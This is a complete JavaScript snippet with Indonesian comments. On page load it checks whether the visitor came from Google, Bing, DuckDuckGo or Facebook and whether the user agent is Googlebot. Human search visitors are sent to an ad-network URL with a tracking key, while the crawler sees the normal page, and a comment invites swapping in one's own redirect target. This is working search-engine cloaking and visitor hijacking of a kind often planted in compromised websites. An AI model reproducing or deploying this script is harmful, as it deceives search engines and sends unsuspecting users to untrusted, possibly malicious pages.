// Fungsi untuk memeriksa apakah pengunjung berasal dari domain Google
  function isFromGoogle() {
    var referrer = document.referrer.toLowerCase();
    var googleDomains = [
      'google.com', 'google.co.uk', 'google.co.id', 'google.co.jp', 
      'google.fr', 'google.de', 'google.it', 'google.ca', 'google.com.au',
      'google.ae', 'google.be', 'google.com.br', 'google.ch', 'google.cl',
      'google.cn', 'google.cz', 'google.dk', 'google.es', 'google.fi', 
      'google.gr', 'google.hu', 'google.ie', 'google.in', 'google.co.in', 
      'google.co.il', 'google.co.kr', 'google.lt', 'google.lv', 'google.nl', 
      'google.no', 'google.pl', 'google.pt', 'google.ro', 'google.ru', 
      'google.se', 'google.sg', 'google.co.za', 'google.sk', 'google.co.th', 
      'google.com.tr', 'google.ae', 'google.com.eg', 'google.com.ar', 
      'google.com.mx', 'google.com.my', 'google.com.ph', 'google.co.ve', 
      'bing.com', 'duckduckgo.com', 'google.co.nz', 'facebook.com', 'l.facebook.com'
    ];

    // Cek apakah referrer berasal dari salah satu domain Google
    for (var i = 0; i < googleDomains.length; i++) {
      if (referrer.indexOf(googleDomains[i]) !== -1) {
        return true;
      }
    }
    return false;
  }

  // Fungsi untuk memeriksa apakah user-agent adalah salah satu varian Googlebot
  function isGooglebot() {
    var userAgent = navigator.userAgent.toLowerCase();
    var googlebotUserAgents = [
      "googlebot", 
      "googlebot-image", 
      "googlebot-news",
      "googlebot-video",
      "googlebot-mobile"
    ];
    
    // Cek apakah user-agent cocok dengan salah satu dari Googlebot user-agent
    for (var i = 0; i < googlebotUserAgents.length; i++) {
      if (userAgent.indexOf(googlebotUserAgents[i]) !== -1) {
        return true;
      }
    }
    return false;
  }

  // Fungsi untuk redirect jika dari Google dan bukan Googlebot
  function redirectIfFromGoogle() {
    var targetUrl = "https://www.effectivegatecpm.com/xfmgy6bvi?key=44581a60f8db91d6c9e89eebd31c3fb9";  // Ubah URL ke target redirect kamu

    // Jika referrer berasal dari Google dan bukan Googlebot, lakukan redirect
    if (isFromGoogle() && !isGooglebot()) {
      window.location.href = targetUrl;
    }
  }

  // Memastikan script dijalankan setelah halaman selesai dimuat
  window.onload = function() {
    redirectIfFromGoogle();
  };
